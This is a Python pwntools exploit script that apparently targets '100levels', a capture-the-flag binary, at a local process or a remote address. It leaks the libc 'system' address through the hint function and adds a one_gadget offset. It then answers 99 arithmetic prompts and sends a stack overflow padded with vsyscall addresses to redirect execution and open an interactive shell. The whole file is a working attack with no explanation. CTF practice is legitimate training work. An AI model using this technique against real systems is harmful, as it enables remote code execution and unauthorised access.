#!/usr/bin/env python
from pwn import *
debug=1
#context.log_level = 'debug'
vsyscall=0xffffffffff600000

if debug:
    io = process('./100levels')
else:
    io=remote("111.198.29.45",41268)
libc=ELF('./libc.so.6')
elf=ELF('./100levels')

def go(first, more):
    io.recvuntil("Choice:\n")
    io.sendline('1')    
    io.recvuntil("How many levels?\n")
    io.sendline(str(first))
    io.recvuntil("Any more?\n")
    io.sendline(str(more))

def hint():
    io.recvuntil("Choice:\n")
    io.sendline('2')

def answer():
    io.recvuntil("Question:")
    num1=int(io.recv(3))
    io.recvuntil("*")
    num2=int(io.recv(3))
    io.recvuntil("Answer:")
    io.sendline(str(num1*num2))

one_gadget = 0x4526a
system_offset = libc.symbols['system']
hint()
go(0,one_gadget - system_offset)
for i in range(99):
    answer()
io.recvuntil("Question:")
num1=int(io.recv(3))
io.recvuntil("*")
num2=int(io.recv(3))
io.recvuntil("Answer:")
content=''
content+='c'*48
content+='b'*8
content+=p64(vsyscall)*3
io.send(content)

io.interactive()